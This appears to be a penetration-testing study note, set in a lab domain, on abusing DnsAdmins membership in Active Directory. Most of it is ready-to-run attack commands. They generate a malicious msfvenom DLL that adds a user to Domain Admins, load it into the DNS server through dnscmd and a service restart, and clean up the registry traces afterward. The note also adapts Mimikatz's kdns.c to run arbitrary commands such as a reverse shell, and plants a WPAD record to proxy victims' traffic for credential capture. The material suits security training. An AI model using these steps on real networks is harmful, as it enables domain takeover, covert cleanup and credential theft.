> This group's member have access to DNS record, and can do DLL injection on the DNS server
> In a lot of case, the domain controller is the DNS server. And DNS server usually run with `NT AUTHORITY/SYSTEM` privilege

## DLL injection

Generate a malicious dll

```sh
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

Move the dll to the target machine and do this:

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

> After this, you have to wait until the DNS server is restarted for it to load the dll

### Restart dns service

View our current user's SID

```cmd
wmic useraccount where name="netadm" get sid
```

See our privilege over the DNS service, `RPWP` means we can start and stop the service

```cmd
sc.exe sdshow DNS
```

Stop service

```cmd
sc stop dns
```

Start DNS service

```cmd
sc start dns
```

After restarting your controlled user should be in `Domain Admins` group

```cmd
net group "Domain Admins" /dom
```

But holdup, even though you are technically domain admin, your session is still not updated, so either log out

```cmd
logoff
```

Or forced update group policy (this doesn't work for me)

```cmd
gpupdate /force
```

### Cleanup

Confirm that the registry key is added because of us

```cmd
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

Delete the registry key

```cmd
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```

Re-enable DNS service

```cmd
sc start dns
```

Confirm status

```cmd
sc query dns
```

### Using Mimilib.dll

As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.

```c
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
##include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
##pragma warning(push)
##pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
##pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```

## WPAD record

> Creating one will make every machine running WPAD with default settings will have its traffic proxied through our attack machine. Then we can use `responder` or `inveigh`

To set up this attack, we first disabled the global query block list

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

Next, we add a WPAD record pointing to our attack machine

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
